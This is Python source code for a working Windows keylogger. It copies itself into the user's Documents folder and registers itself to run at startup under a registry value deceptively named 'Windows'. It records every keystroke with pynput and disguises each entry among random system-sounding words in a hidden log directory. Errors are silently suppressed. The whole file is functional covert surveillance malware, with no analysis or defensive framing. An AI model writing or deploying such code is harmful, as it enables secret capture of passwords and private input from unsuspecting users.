import os
import queue
import random
import sys
import shutil
import threading
import uuid
import winreg
from datetime import datetime, timedelta
from pynput import keyboard

LOG_FILEPATH = 'C:/NulledLogs'
LOG_FILENAME = f'{LOG_FILEPATH}/{uuid.uuid4()}.log'
PREFIXES = ['kernel', 'driver', 'auth', 'policy', 'event', 'audit', 'system', 'access', 'handle', 'service']
SUFFIXES = ['granted', 'failed', 'bypass', 'monitor', 'watch', 'trigger', 'logged', 'inspect', 'validate', 'encrypt']


class RollingLogManager:
    def __init__(self, log_file: str, retention_days: int = 1, cleanup_interval: int = 100) -> None:
        self.log_file = log_file
        self.retention_period = timedelta(days=retention_days)
        log_dir = os.path.dirname(self.log_file)
        if log_dir:
            os.makedirs(log_dir, exist_ok=True)
        self.lock = threading.Lock()
        self._entry_count = 0
        self.cleanup_interval = cleanup_interval
        self.log_queue = queue.Queue()
        self.worker_thread = threading.Thread(target=self._log_worker, daemon=True)
        self.worker_thread.start()

    def _log_worker(self) -> None:
        while True:
            entry_text = self.log_queue.get()
            with self.lock:
                self._entry_count += 1
                timestamp = datetime.now().isoformat()
                with open(self.log_file, 'a') as f:
                    f.write(f"{timestamp} - {entry_text}\n")
                if self._entry_count >= self.cleanup_interval:
                    self._cleanup_log_internal()
                    self._entry_count = 0
            self.log_queue.task_done()

    def log_entry(self, entry_text: str) -> None:
        self.log_queue.put(entry_text)

    def _cleanup_log_internal(self) -> None:
        now = datetime.now()
        if not os.path.exists(self.log_file):
            return
        recent_entries = []
        try:
            with open(self.log_file, 'r') as f:
                for line in f:
                    try:
                        timestamp_str = line.split(' - ')[0]
                        log_time = datetime.fromisoformat(timestamp_str)
                        if now - log_time <= self.retention_period:
                            recent_entries.append(line)
                    except (ValueError, IndexError):
                        recent_entries.append(line)
            with open(self.log_file, 'w') as f:
                f.writelines(recent_entries)
        except IOError:
            pass

    def cleanup_log(self) -> None:
        with self.lock:
            self._cleanup_log_internal()


class Runner:
    def __init__(self) -> None:
        self.logger = RollingLogManager(LOG_FILENAME)
        self.post_init()

    def post_init(self) -> None:
        try:
            exe = os.path.basename(sys.executable if getattr(sys, 'frozen', False) else __file__)
            key = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
            directory = os.path.join(os.path.expanduser('~'), 'Documents', 'Resources')
            path = os.path.join(directory, exe)
            os.makedirs(directory, exist_ok=True)
            script_path = sys.argv[0]
            shutil.copy(script_path, path)
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, 'Windows', 0, winreg.REG_SZ, path)
        except Exception:
            pass

    def run(self) -> None:
        try:
            def get_sensor_reading(key) -> str:
                prefix = random.choice(PREFIXES)
                suffix = random.choice(SUFFIXES)
                return f'{prefix} {key} {suffix}'

            def on_press(key) -> None:
                if hasattr(key, 'char') and key.char is not None:
                    content = key.char
                else:
                    content = str(key)
                self.logger.log_entry(get_sensor_reading(content))

            with keyboard.Listener(on_press=on_press) as listener:
                listener.join()
        except Exception:
            pass


runner = Runner()
runner.run()
